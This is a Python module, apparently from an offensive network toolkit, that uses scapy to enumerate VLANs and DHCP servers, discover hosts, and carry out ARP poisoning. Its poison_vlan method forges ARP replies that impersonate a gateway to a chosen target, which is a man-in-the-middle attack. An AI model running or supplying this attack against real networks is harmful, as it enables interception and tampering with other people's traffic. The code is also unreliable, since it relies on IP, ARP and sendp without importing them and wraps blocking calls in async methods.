import asyncio
from scapy.all import sniff, Dot1Q, DHCP, Ether
from scapy.data import ETH_P_ALL
from core.scanner import NetworkScanner
from core.packet_crafter import PacketCrafter
from core.utils import VLANResult, mac_vendor_lookup

class VLANExplorer(NetworkScanner):
    def __init__(self, interface: str):
        super().__init__(interface)
        self.vlan_tags = set()
        self.dhcp_servers = {}
    
    async def sniff_vlans(self, duration: int = 30) -> set:
        def packet_handler(pkt):
            if Dot1Q in pkt:
                vlan_id = pkt[Dot1Q].vlan
                self.vlan_tags.add(vlan_id)
                
                # Extract DHCP server info
                if DHCP in pkt and pkt[DHCP].options[0][1] == 2:  # DHCP Offer
                    server_ip = pkt[IP].src
                    options = {opt[0]: opt[1] for opt in pkt[DHCP].options}
                    self.dhcp_servers[vlan_id] = {
                        'server_ip': server_ip,
                        'router': options.get(3),
                        'subnet_mask': options.get(1),
                        'lease_time': options.get(51)
                    }
        
        sniff(prn=packet_handler, timeout=duration, filter="vlan or port 67", 
              store=False, iface=self.interface)
        return self.vlan_tags
    
    async def poison_vlan(self, target_ip: str, gateway_ip: str, vlan_id: int):
        arp_poison = self.crafter.craft_arp(
            src_ip=gateway_ip,
            dst_ip=target_ip,
            opcode=2,  # ARP reply
            vlan=vlan_id
        )
        sendp(arp_poison, iface=self.interface, verbose=False)
    
    async def discover_vlan_devices(self, vlan_id: int) -> VLANResult:
        # Send DHCP discover to trigger responses
        dhcp_discover = self.crafter.craft_dhcp_discover(vlan_id)
        sendp(dhcp_discover, iface=self.interface, verbose=False)
        
        # Capture ARP traffic
        devices = set()
        def arp_handler(pkt):
            if ARP in pkt and pkt[ARP].psrc != self.local_info.ip:
                devices.add((pkt[ARP].psrc, pkt[ARP].hwsrc))
        
        sniff(prn=arp_handler, timeout=10, filter="arp", 
              store=False, iface=self.interface)
        
        return VLANResult(vlan_id, devices)
